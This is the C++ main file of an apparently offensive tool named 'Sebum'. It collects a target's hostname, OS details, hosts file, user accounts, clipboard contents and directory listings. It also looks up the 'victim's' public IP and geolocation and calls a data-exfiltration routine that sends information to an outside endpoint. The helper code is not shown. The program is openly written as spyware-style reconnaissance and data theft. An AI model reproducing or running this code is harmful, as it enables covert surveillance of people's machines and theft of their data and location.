#include <iostream>
#include <fstream>
#include <vector>
#include <unordered_map>
#include <string>
#include <cstring>
#include <sstream>
#include <cstdlib>
#include <filesystem>
#include <sys/stat.h>

// clipboard management
#include <limits.h>
#include <X11/Xlib.h>

// internal includes
#include "headers/utils.h"

int main(int argc, char* argv[]) {

  /*
   *
   * PRINT A F* BANNER
   *
   */

  // Prints the Sebum banner

  Utils::printBanner();


  std::string osHostname {System::getOsHostname()};
  std::cout << "\n=============HOSTNAME INFORMATIONS=============\n"
            << osHostname
            << "===============================================\n";


  std::string osInfos {System::getOsInfos()};
  std::cout << "\n================OS INFORMATIONS================\n"
            << osInfos
            << "===============================================\n";


  std::string hostsInfos {System::getHostsFile()};
  std::cout << "\n==============HOSTS INFORMATIONS==============\n"
            << hostsInfos
            << "==============================================\n";


  std::string currentUserInfos {System::getCurrentUserInfos()};
  std::cout << "\n===========CURRENT USER INFORMATIONS===========\n"
            << currentUserInfos
            << "===============================================\n";


  std::string allUsers {System::getAllUsers()};
  std::cout << "\n=================LIST OF USERS=================\n"
            << allUsers
            << "===============================================\n";


  std::string clipboardContent {System::getClipboardContent()};
  std::cout << "\n===============CLIPBOARD CONTENT===============\n"
            << clipboardContent
            << "\n===============================================\n";


  std::cout << "\n=============MAIN DIRECTORIES CONTENT=============\n";
  std::unordered_map<std::string, std::vector<std::string>> directoriesContent {System::getBasicDirectoryContent()};
  
  System::showBasicDirectoryContent(directoriesContent);
  std::cout << "===============================================\n";


  std::cout << "\n===============VICTIM'S IP INFOS===============\n";
  CURL *hnd {OutsideTheBox::init()};

  std::string victimIP {OutsideTheBox::getVictimsIp(hnd)};

  std::string victimIPLocationInfos {OutsideTheBox::getVictimsIpLocationInfos(hnd, victimIP)};

  if (victimIP != "None") {
    std::cout << "Victim's IP : " << victimIP << "\n\n"; 
  }

  if (victimIPLocationInfos != "None") {
    std::cout << "Victim's IP location : " << victimIPLocationInfos; 
  }


  std::vector<std::string> victimIPLocationLatLon {OutsideTheBox::getVictimsIpLatLon(victimIPLocationInfos)};
  std::string victimIPLocationLat {victimIPLocationLatLon[0]};
  std::string victimIPLocationLon {victimIPLocationLatLon[1]};

  for (int o {0}; o < victimIPLocationLatLon.size(); o++) {
    std::cout << "victimIPLocationLatLon[" << o << "] : " << victimIPLocationLatLon[o] << '\n';
  }
  std::cout << "victimIPLocationLat : " << victimIPLocationLat << '\n';
  std::cout << "victimIPLocationLon : " << victimIPLocationLon << '\n';
  
  std::cout << "\n\n  -> " << OutsideTheBox::getVictimsIpLocationMaps(victimIPLocationLat, victimIPLocationLon) << std::endl;
  std::cout << "\n\n" << OutsideTheBox::dataExf(hnd, "test");
  std::cout  << "\n===============================================\n";

  OutsideTheBox::cleanup(hnd);

  return 0;
}